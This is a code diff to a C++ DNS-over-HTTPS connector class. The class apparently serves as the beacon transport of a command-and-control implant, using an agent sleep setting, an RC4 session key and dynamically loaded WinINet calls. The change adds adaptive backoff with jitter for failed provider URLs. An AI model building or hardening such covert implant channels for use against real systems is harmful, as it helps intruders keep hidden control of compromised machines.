@@ -88,7 +88,7 @@ ConnectorDoH::~ConnectorDoH()
 {
 }
 
-BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
+BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize, ULONG sleepDelaySeconds)
 {
     // Verify WinINet APIs are loaded
     if (!this->functions || !this->functions->InternetOpenA || !this->functions->HttpSendRequestA) {
@@ -96,6 +96,9 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
     }
 
     this->profile = profile;
+
+    // cache agent sleep for adaptive provider backoff
+    this->sleepDelaySeconds = sleepDelaySeconds;
 
     // encrypt_key is a 16-byte RC4 session key, not a null-terminated string.
     // Always copy the full 16 bytes instead of using StrLenA, which may walk
@@ -455,7 +458,15 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
                 this->connectedUrlIndex = 0xFFFFFFFF; // Mark as no valid connection
                 this->urlFailCount[idx]++;
                 if (this->urlFailCount[idx] >= 2) {
+                    // Adaptive backoff: tie disable duration to configured sleep.
+                    // Clamp to [5s, 30s] to avoid overly aggressive retry loops.
                     ULONG backoff = 30000;
+                    if (this->sleepDelaySeconds > 0) {
+                        ULONG b = this->sleepDelaySeconds * 2000; // 2 * sleep (ms)
+                        if (b < 5000) b = 5000;
+                        if (b > 30000) b = 30000;
+                        backoff = b;
+                    }
                     ULONG jitter = GetTickCount() & 0x0FFF;
                     this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
                     this->urlFailCount[idx] = 0;
@@ -472,7 +483,15 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
         if (!hRequest) {
             this->urlFailCount[idx]++;
             if (this->urlFailCount[idx] >= 2) {
+                // Adaptive backoff: tie disable duration to configured sleep.
+                // Clamp to [5s, 30s] to avoid overly aggressive retry loops.
                 ULONG backoff = 30000;
+                if (this->sleepDelaySeconds > 0) {
+                    ULONG b = this->sleepDelaySeconds * 2000; // 2 * sleep (ms)
+                    if (b < 5000) b = 5000;
+                    if (b > 30000) b = 30000;
+                    backoff = b;
+                }
                 ULONG jitter = GetTickCount() & 0x0FFF;
                 this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
                 this->urlFailCount[idx] = 0;
@@ -1385,7 +1404,15 @@ void ConnectorDoH::ReportProtocolResult(BOOL success)
 	this->urlFailCount[idx]++;
 	const ULONG max_fail = 2;
 	if (this->urlFailCount[idx] >= max_fail) {
+		// Adaptive backoff: tie disable duration to configured sleep.
+		// Clamp to [5s, 30s] to avoid overly aggressive retry loops.
 		ULONG backoff = 30000;
+		if (this->sleepDelaySeconds > 0) {
+			ULONG b = this->sleepDelaySeconds * 2000; // 2 * sleep (ms)
+			if (b < 5000) b = 5000;
+			if (b > 30000) b = 30000;
+			backoff = b;
+		}
 		ULONG jitter = GetTickCount() & 0x0FFF;
 		this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
 		this->urlFailCount[idx] = 0;
